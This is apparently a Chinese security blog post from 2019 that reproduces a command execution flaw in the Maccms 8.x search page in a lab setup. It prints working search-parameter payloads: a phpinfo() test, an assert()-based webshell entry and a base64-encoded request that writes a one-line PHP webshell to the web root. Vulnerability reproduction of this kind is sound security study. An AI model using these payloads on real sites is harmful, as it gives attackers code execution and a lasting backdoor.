---
title:  Maccms8.x(苹果cms)命令执行漏洞复现
date: 2019-11-04 16:20:12
author: dylan
top: false
cover: false
password: 
categories: web安全
tags: 
    - Maccms
    - 漏洞复现
    - 苹果cms
    - Command Execution
---
# 0x00 漏洞概述

村里刚通网，复现下maccms的命令执行漏洞
该漏洞主要的产生原因是CMS搜索页面搜索参数过滤不严
导致直接eval执行PHP语句，前台命令执行可getshell

# 0x01 影响版本

**Maccms8.x**

# 0x02 漏洞复现
## 环境搭建

下载Github上的环境：
[Maccms8.x源码](https://github.com/yaofeifly/Maccms8.x)

然后使用`phpstudy`搭建安装即可
也可自己搭建`Apache+Mysql+php`环境安装

![](https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191104164824.png)

## 漏洞利用

payload：

`url+/index.php?m=vod-search&wd={if-A:phpinfo()}{endif-A}`

![](https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191104165220.png)




getshell payload（a）:

`url+/index.php?m=vod-search&wd={if-A:assert($_POST[a])}{endif-A}`   
POST  
`a=phpinfo()`

![](https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191104170625.png)




写入网站根目录一句话木马文件payload（文件名：test.php，密码：test）:

`url+/index.php?m=vod-search`
```
wd={if-A:print(fputs%28fopen%28base64_decode%28dGVzdC5waHA%29,w%29,base64_decode%28PD9waHAgQGV2YWwoJF9QT1NUW3Rlc3RdKTsgPz4%29%29)}{endif-A}
```

![](https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191104173840.png)

![](https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191104174007.png)



# 0x03 参考文章
[苹果CMS漏洞](https://blog.csdn.net/m0_37438418/article/details/81006161)
[Maccms8.x: Maccms8.x](https://github.com/yaofeifly/Maccms8.x)